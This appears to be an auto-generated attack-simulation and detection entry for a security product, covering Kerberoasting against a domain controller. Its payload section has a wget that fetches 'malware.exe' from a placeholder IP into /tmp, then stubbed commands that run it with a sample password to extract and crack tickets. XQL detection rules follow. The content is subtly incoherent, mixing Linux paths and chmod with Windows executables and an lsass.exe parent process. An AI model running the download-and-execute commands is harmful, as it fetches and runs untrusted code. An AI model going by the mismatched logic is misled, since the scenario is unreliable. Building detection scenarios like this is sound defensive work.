identity.name: Abnormal User Login to Domain Controller via Kerberoasting
identity.summary: An attacker uses a compromised user account to request service tickets for high-privilege accounts, then attempts to crack them offline. Cortex should detect abnormal login behavior and process execut
identity.description: An attacker uses a compromised user account to request service tickets for high-privilege accounts, then attempts to crack them offline. Cortex should detect abnormal login behavior and process execution patterns associated with Kerberoasting.

techniques.name: Steal or Forge Kerberos Tickets: Kerberoasting

payload.code:
wget http://192.0.2.10/malware.exe -O /tmp/kerberoast.exe
stub chmod +x /tmp/kerberoast.exe
stub /tmp/kerberoast.exe --target DC01.domain.local --user compromised_user@domain.local --password P@ssw0rd123
stub /tmp/kerberoast.exe --extract --ticket TGS_Ticket_123456
stub /tmp/kerberoast.exe --crack --hashes TGS_Ticket_123456

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Unusual Process Execution from Temp Directory
biocs.description: Detection of process execution from temporary directory with Kerberoasting behavior
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name contains '/tmp/' and action_process_image_name contains 'kerberoast'
| filter actor_process_image_name = 'lsass.exe' or actor_process_image_name = 'cmd.exe'

abiocs.name: Abnormal User Login to Domain Controller
abiocs.description: Detection of user login to domain controller with unusual timing or context
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.NETWORK_CONNECTION
| filter action_remote_ip = '192.0.2.50' and dst_port = 88
| filter actor_process_image_name = 'lsass.exe'
| filter causality_actor_process_image_name = 'svchost.exe'

xql_queries.name: Kerberoasting Network Activity
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.NETWORK_CONNECTION
| filter action_remote_ip = '192.0.2.50' and dst_port = 88
| filter actor_process_image_name = 'lsass.exe'
